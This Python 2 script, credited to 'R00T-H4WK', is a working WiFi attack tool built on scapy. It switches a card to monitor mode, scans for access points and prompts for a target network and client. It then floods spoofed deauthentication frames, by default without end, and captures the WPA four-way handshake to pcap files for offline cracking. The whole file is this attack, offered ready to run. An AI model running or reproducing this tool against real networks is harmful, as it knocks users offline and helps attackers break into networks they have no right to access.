
import argparse
from multiprocessing import Process
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import signal
import threading
from sys import platform

print
print " ____  _____    _   _   _ _____ _   _ "
print "|  _ \| ____|  / \ | | | |_   _| | | |"
print "| | | |  _|   / _ \| | | | | | | |_| |"
print "| |_| | |___ / ___ \ |_| | | | |  _  |"
print "|____/|_____/_/   \_\___/  |_| |_| |_|"
print
print "Author : R00T-H4WK"
print "Country: Indonesian"
print

"""
OSX Devices
networksetup -listallhardwareports
"""


"""
Capture Hand Shake
"""
class CaptureHandShake():
	"""
	Init
	"""
	def __init__(self, iface):
		self.wpa_handshake = []
		self.iface = iface
		self.acceptAny = False
		self.packetMax = 100
		self.packetCount = 0


	"""
	Handle the packets
	"""
	def handle_packet(self, packet):

		if self.acceptAny == True:
			print packet.summary()
			self.wpa_handshake.append(packet)
			self.packetCount += 1

			if self.packetCount == self.packetMax:
				filename = "pcaps/wpa-handshake-" + str(datetime.datetime.now().strftime("%Y-%m-%d-%H-%M-%S")) + ".pcap"
				wrpcap(filename, self.wpa_handshake)
				self.wpa_handshake = []
				self.acceptAny = False
				self.packetCount = 0
		else:
			#got EAPOL KEY packet
			if (packet.haslayer(EAPOL) and packet.type == 2) or self.acceptAny == True:
				print packet.summary()
				self.wpa_handshake.append(packet)

			#if we have 4 packets
			if len(self.wpa_handshake) >= 4:
				self.acceptAny = True
				print "\n"
				print '='*100
				print "\n"


	"""
	Start the sniffer
	"""
	def start(self):
		os.system("clear")
		print '='*100
		print "Sniffing on interface: " + self.iface
		print '='*100
		sniff(iface=self.iface, prn=self.handle_packet)


"""
Deauth Attack Class
"""
class deauth:
	"""
	Deauth class constructor
	"""
	def __init__(self, interface):
		self.interface = interface
		self.networks = {}
		self.stop_sniff = False
		self.signal = signal
		self.channel_hop = None
		self.target_bssid = ""
		self.interupted = False
		self.listenKeyboard = None


	"""
	Turn on monitor mode
	"""
	def monitorMode(self):
		os.system("ifconfig " + self.interface + " down")
		os.system("iwconfig " + self.interface + " mode monitor")
		os.system("ifconfig " + self.interface + " up")


	"""
	Start the network sniffer
	"""
	def start_sniffer(self):
		os.system("clear")
		print '='*100
		print "\nPress CTRL+c to stop sniffing..\n"
		print '='*100 + '\n{0:5}\t{1:30}\t{2:30}\n'.format('Channel','ESSID','BSSID') + '='*100
		
		channel_hop = Process(target = self.channel_hopper, args=(self.interface,))
    		channel_hop.start()

		stopsniff = False
		sniff( lfilter = lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), stop_filter=stopsniff, prn=lambda x: self.add_network(x) )

		try:
		    	while True:	
				time.sleep(1)
		except KeyboardInterrupt:
			stopsniff = True



	"""
	Swicth wifi channels
	"""
	def channel_hopper(self, interface):
		while True:
			try:
				channel = random.randrange(1,13)
				os.system("iwconfig %s channel %d" % (interface, channel))
				time.sleep(1)
			except KeyboardInterrupt:
				break


	"""
	Add a found network to the list
	"""
	def add_network(self, pckt):
		essid = pckt[Dot11Elt].info if '\x00' not in pckt[Dot11Elt].info and pckt[Dot11Elt].info != '' else 'Hidden SSID'
		bssid = pckt[Dot11].addr3
		channel = int(ord(pckt[Dot11Elt:3].info))
		if bssid not in self.networks:
			self.networks[bssid] = ( essid, channel )
			print "{0:5}\t{1:30}\t{2:30}".format(channel, essid, bssid)


	"""
	Stop hopping channels
	"""
	def stop_channel_hop(self, signal, frame):
		self.stop_sniff = True
		self.channel_hop.terminate()
		self.channel_hop.join()


	"""
	Stop the niff
	"""
	def keep_sniffing(self, pckt):
		return self.stop_sniff


	"""
	Send Deauth packets
	"""
	def perform_deauth(self, bssid, client, count):
		pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
		cli_to_ap_pckt = None
		if client != 'FF:FF:FF:FF:FF:FF' : cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()
		print 'Sending Deauth to ' + client + ' from ' + bssid
		if not count:
			print 'Press CTRL+C to quit'
		count = int(count)
		while count != 0:
			try:
				for i in range(64):
					# Send out deauth from the AP
					send(pckt)
					# If we're targeting a client, we will also spoof deauth from the client to the AP
					if client != 'FF:FF:FF:FF:FF:FF': send(cli_to_ap_pckt)
				# If count was -1, this will be an infinite loop
				count -= 1
			except KeyboardInterrupt:
				break


	"""
	Get the target to attack
	"""
	def getTarget(self):
		print "\n\n"
		print '='*100

		target_bssid = raw_input('\nEnter a BSSID to perform an deauth attack (q to quit): ')
		self.target_bssid = target_bssid

		while target_bssid not in self.networks:
			target_bssid = raw_input('\nEnter a BSSID to perform an deauth attack (q to quit): ')
			self.target_bssid = target_bssid
			if target_bssid == 'q':
				sys.exit(0)

		# Get our interface to the correct channel
		print 'Changing ' + self.interface + ' to channel ' + str(self.networks[target_bssid][1])
		os.system("iwconfig %s channel %d" % (self.interface, self.networks[target_bssid][1]))
		print "\n\n"
		print '='*100


	"""
	Loop for client packets on the selected channel
	"""
	def sniffClients(self):
		interupted = False
		try:
			sniff(iface=self.interface, prn=self.getClients, stop_filter=interupted )
			while True:
	        		time.sleep(1)
		except KeyboardInterrupt:
			interupted = True


	"""
	Get the clients for the BSSID
	"""
	def getClients(self, pkt):
		bssid = pkt[Dot11].addr3
		target_bssid = self.target_bssid
		if target_bssid == bssid and not pkt.haslayer(Dot11Beacon) and not pkt.haslayer(Dot11ProbeReq) and not pkt.haslayer(Dot11ProbeResp):
			print pkt.summary()


	"""
	Packet Info
	"""
	def pktInfo(self, pkt):
		bssid = pkt[Dot11].addr3
		p = pkt[Dot11Elt]
		cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}""{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
		ssid, channel = None, None
		crypto = set()
		while isinstance(p, Dot11Elt):
			if p.ID == 0:
				ssid = p.info
			elif p.ID == 3:
				channel = ord(p.info)
			elif p.ID == 48:
				crypto.add("WPA2")
			elif p.ID == 221 and p.info.startswith('\x00P\xf2\x01\x01\x00'):
				crypto.add("WPA")
			p = p.payload
		if not crypto:
			if 'privacy' in cap:
				crypto.add("WEP")
			else:
				crypto.add("OPN")
		print "    %r [%s], %s" % (ssid, bssid,' / '.join(crypto) )


	"""
	Attack the target
	"""
	def attackTarget(self):
		print "\n\n"
		print '='*100
		# Now we have a bssid that we have detected, let's get the client MAC
		target_client = raw_input('Enter a client MAC address (Default: FF:FF:FF:FF:FF:FF): ')
		if not target_client: target_client = 'FF:FF:FF:FF:FF:FF'
		deauth_pckt_count = raw_input('Number of deauth packets (Default: -1 [constant]): ')
		print "\n\n"
		print '='*100
		if not deauth_pckt_count:
			deauth_pckt_count = -1
		self.perform_deauth(self.target_bssid, target_client, deauth_pckt_count)


def main():
	"""
	Set the command line options
	"""
	parser = argparse.ArgumentParser( description='deauth.py - Perform a Deauth WIFI Attack - python deauth.py -i wlan0 -m 1')
	parser.add_argument('-i', '--interface', dest='iface', type=str, required=True, help='WIFI Interface')
	parser.add_argument('-m', '--monitormode', dest='monitor', type=str, required=False, help='Activate Monitor Mode')

	"""
	Get the command line options
	"""
	args = parser.parse_args()
	conf.iface = args.iface

	"""
	Create the deauth class and begin the attack
	"""
	#create class instance
	de = deauth(args.iface)

	# if turn on monitor mode
	if args.monitor != "" and args.monitor != None:
		de.monitorMode()

	#start the ssid sniffer
	de.start_sniffer()

	#choose target
	de.getTarget()

	#sniff for client mac's
	de.sniffClients()

	#attack the target
	de.attackTarget()

	#capture the handshake packets
	sn = CaptureHandShake(args.iface)
	sn.start()

if __name__ == "__main__":
	main()
